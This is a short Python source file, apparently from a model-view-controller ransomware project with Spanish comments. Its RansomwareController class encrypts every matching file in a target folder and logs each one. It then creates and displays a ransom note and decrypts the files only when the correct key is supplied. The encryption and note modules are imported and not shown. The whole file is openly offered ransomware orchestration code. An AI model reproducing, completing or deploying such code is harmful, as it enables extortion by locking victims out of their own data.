from models.file_manager import FileManager
from models.crypto_manager import CryptoManager
from views.user_interface import UserInterface
from views.ransom_note import RansomNote

class RansomwareController:
    def __init__(self, destination, extensions):
        self.file_manager = FileManager(destination, extensions)
        self.crypto_manager = CryptoManager(destination)
        self.ui = UserInterface(self)  # Pasar la instancia del controlador a la interfaz
        self.ransom_note = RansomNote(self.crypto_manager.key, destination, self.ui)  # Pasar la interfaz

    def encrypt_files(self):
        # Cifrar cada archivo encontrado
        for file in self.file_manager.files:
            self.crypto_manager.encrypt(f"{self.file_manager.destination}/{file}")
            self.file_manager.log_activity("Encrypted", file)
        # Crear y mostrar la nota de rescate
        self.ransom_note.create_note()
        # Mostrar el mensaje de rescate en la interfaz gráfica
        self.ui.show_ransom_message(self.ransom_note.note_content)

    def decrypt_files(self, decryption_key):
        # Comparar la clave ingresada con la clave almacenada
        if decryption_key == self.crypto_manager.key:
            for file in self.file_manager.files:
                # Descifrar cada archivo
                self.crypto_manager.decrypt(f"{self.file_manager.destination}/{file}", decryption_key)
                self.file_manager.log_activity("Decrypted", file)
            # Mostrar un mensaje de éxito si el descifrado es correcto
            return True
        else:
            print("Clave incorrecta. No puedes recuperar los archivos.")
            return False
